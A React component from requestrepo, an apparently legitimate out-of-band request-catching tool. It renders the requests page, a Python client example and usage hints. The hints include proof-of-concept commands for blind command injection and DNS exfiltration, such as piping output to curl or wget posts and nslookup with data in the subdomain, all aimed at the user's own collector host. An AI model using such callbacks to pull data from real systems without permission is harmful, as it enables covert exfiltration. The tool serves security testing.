import React, { Component, useEffect, useState } from "react";
import { RequestInfo } from "./request-info";
import { EditorComponent } from "./editor";
import { Button } from "primereact/button";
import { toast } from "react-toastify";
import { Utils } from "../utils";
import { Badge } from "primereact/badge";

export function RequestsPage({ user, sharedRequest }) {
  const [isEditorFocused, setIsEditorFocused] = useState(false);
  const [selectedRequest, setSelectedRequest] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [hasUserRequests, setHasUserRequests] = useState(false);

  // Check if user has any requests (for notification purposes)
  useEffect(() => {
    if (user && user.requests && Object.keys(user.requests).length > 0) {
      setHasUserRequests(true);
    } else {
      setHasUserRequests(false);
    }
  }, [user?.requests ? Object.keys(user.requests).length : 0]);

  // Update selected request whenever shared request, user, or user's selectedRequest changes
  useEffect(() => {
    // Reset state when user changes
    if (!user) {
      setSelectedRequest(null);
      return;
    }

    // Priority 1: Show shared request if available
    if (sharedRequest) {
      setSelectedRequest(sharedRequest);
      return;
    }

    // Priority 2: Show user's selected request if valid
    if (
      user.selectedRequest &&
      user.requests &&
      user.requests[user.selectedRequest]
    ) {
      setSelectedRequest(user.requests[user.selectedRequest]);
      return;
    }

    // Priority 3: Show first available request if none selected
    if (user.requests && Object.keys(user.requests).length > 0) {
      const requestIds = Object.keys(user.requests);
      setSelectedRequest(user.requests[requestIds[0]]);
      return;
    }

    // If no requests available, set to null
    setSelectedRequest(null);
  }, [
    sharedRequest,
    user,
    // Track specific changes to avoid dependency on the entire user object
    user?.selectedRequest,
    // This stringified value changes when requests are added/removed
    user?.requests ? Object.keys(user.requests).length : 0,
  ]);

  const handleEditorFocus = () => {
    setIsEditorFocused(true);
  };

  const handleEditorBlur = () => {
    setIsEditorFocused(false);
  };

  if (!user) {
    return (
      <div className="card card-w-title card-body">
        <h1>No Session Available</h1>
        <p>Please create or select a session to continue.</p>
      </div>
    );
  }

  const activeSession = Utils.getActiveSession();

  const token = isEditorFocused ? activeSession.token : "********";

  // parse url into host:port
  let url;
  try {
    url = new URL("http://" + (user?.domain || window.location.hostname) + "/");
  } catch {
    url = new URL("http://" + window.location.hostname + "/");
  }
  let port = url.port;
  if (!port) port = window.location.protocol === "https:" ? 443 : 80;

  const content = `from requestrepo import Requestrepo # pip install requestrepo
client = Requestrepo(token="${token}", host="${url.hostname}", port=${port}, protocol="${port === 443 ? "https" : "http"}")

print(client.subdomain) # ${user.subdomain}
print(client.domain) # ${user.subdomain}.${user.domain}

client.update_http(raw=b"hello world")

# Get the latest request (blocks until one is received)
new_request = client.get_request()
print("Latest Request:", new_request)`;

  return (
    <div className="card card-w-title card-body">
      {(!selectedRequest ||
        (Object.keys(user?.requests || {}).length === 0 && !sharedRequest)) && (
        <div className="grid">
          <div className="col-12">
            <h1>Awaiting requests</h1>
            <p>How to make a request:</p>
            <code>
              curl http://
              {user?.url || `${user?.subdomain}.${user?.domain}`}
            </code>
            <br />
            <br />
            <code>
              curl http://{user.domain}/r/
              {user?.subdomain || "default"}/
            </code>
            <br />
            <br />
            <code>
              curl -X POST --data hello http://
              {user?.url || `${user?.subdomain}.${user?.domain}`}
            </code>
            <br />
            <br />
            <code>
              nslookup your.data.here.
              {user?.url || `${user?.subdomain}.${user?.domain}`}
            </code>
            <br />
            <br />
            <code>
              echo RCE | curl -d @-{" "}
              {user?.url || `${user?.subdomain}.${user?.domain}`}
            </code>
            <br />
            <br />
            <code>
              wget --post-data "$(echo RCE)" -O-{" "}
              {user?.url || `${user?.subdomain}.${user?.domain}`}
            </code>
            <br />
            <br />
            <p>
              Check out the Response tab to edit your HTTP Response or the DNS
              tab to add DNS records for this subdomain.
            </p>
            <p>
              Automate requests/responses using the{" "}
              <a
                href="https://github.com/adrgs/requestrepo-lib"
                target="_blank"
                rel="noreferrer"
              >
                requestrepo
              </a>{" "}
              Python library:
            </p>
            <CopyButton
              text={content.replace("********", activeSession.token)}
            />
            <EditorComponent
              value={content}
              onChange={() => {}}
              commands={[]}
              language={"python"}
              onFocus={handleEditorFocus}
              onBlur={handleEditorBlur}
            />
          </div>
        </div>
      )}
      {selectedRequest && (
        <RequestInfo
          request={selectedRequest}
          isShared={selectedRequest === sharedRequest}
        />
      )}
    </div>
  );
}

export const CopyButton = ({ text }) => {
  const handleCopy = () => {
    navigator.clipboard
      .writeText(text)
      .then(() =>
        toast.info("Python code copied to clipboard!", Utils.toastOptions),
      )
      .catch(() =>
        toast.error(
          "Failed to copy Python code to clipboard!",
          Utils.toastOptions,
        ),
      );
  };

  return (
    <Button
      label="Copy"
      className="p-button-outlined p-button-secondary"
      style={{ padding: "0.5rem", marginBottom: "1rem" }}
      icon="pi pi-copy"
      onClick={handleCopy}
    />
  );
};
